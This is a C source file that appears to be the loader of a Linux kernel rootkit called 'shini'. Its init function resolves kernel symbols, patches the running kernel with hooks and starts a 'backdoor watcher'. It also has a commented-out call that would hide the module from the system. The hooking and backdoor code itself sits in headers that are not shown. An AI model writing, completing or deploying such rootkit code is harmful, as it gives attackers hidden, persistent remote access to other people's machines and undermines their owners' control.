#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>

/* include */
#include "debug.h"
//#include "config.h"

/* hook */
#include "patch.h"
#include "sym_map.h"

/* module */
#include "module.h"

/* net */
#include "watcher.h"

static int __init shini_init(void)
{
        DEBUG("shini :: shini_init\n");

        // sym map init
        sym_map_init();

        // patch the system
        patch(true);

        // by default hide the module
        // module_hide();

        // init backdoor watcher
        watcher_init();

        return 0;
}

static void __exit shini_exit(void)
{
        DEBUG("shini :: shini_exit\n");

        // unpatch the system
        patch(false);

        // clean watcher
        watcher_clean();
}

module_init(shini_init);
module_exit(shini_exit);

MODULE_AUTHOR("jin-roh");
MODULE_LICENSE("GPL");

